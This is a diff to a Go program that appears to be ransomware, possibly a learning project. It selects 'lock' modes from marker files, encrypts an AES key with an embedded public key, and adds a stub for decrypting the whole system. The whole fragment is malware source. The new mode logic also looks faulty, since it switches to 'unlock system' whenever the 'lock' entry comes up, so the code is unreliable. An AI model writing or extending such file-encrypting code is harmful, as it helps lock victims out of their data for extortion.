@@ -33,6 +33,8 @@ func main() {
 		// ModeDecrypt()
 	case "lock":
 		ModeLockSystem()
+	case "unlock system":
+		// ModeUnlockSystem()
 	default:
 		ModeLockCurrentDir()
 	}
@@ -44,11 +46,15 @@ func SetModeOfOperation() {
 	filesThatAlterMode["THIS MIGHT DESTROY MY COMPUTER"] = "lock"
 
 	for file, mode := range filesThatAlterMode {
-		//check if filr exists
+		//check if file exists
 		if _, err := os.Stat(file); err == nil {
 			Mode = mode
 			pl("Mode of operation set to: ", Mode)
-			break
+		}
+		if mode == "lock" {
+			os.Stat(filesThatAlterMode["decrypted.key"])
+			Mode = "unlock system"
+
 		}
 	}
 }
@@ -79,4 +85,9 @@ func generateAesAndEncryptedAes() ([]byte, []byte) {
 
 	encryptedAESKey = enc.EncryptWithPublicKey(key, enc.BytesToPublicKey(pubKeyVar))
 	return key, encryptedAESKey
+}
+func ModeUnlockSystem() {
+	// AESKey, err := os.ReadFile("decrypted.key")
+	// ErrCheck(err)
+	// system.WholeSystemDecrypt(AESKey)
 }
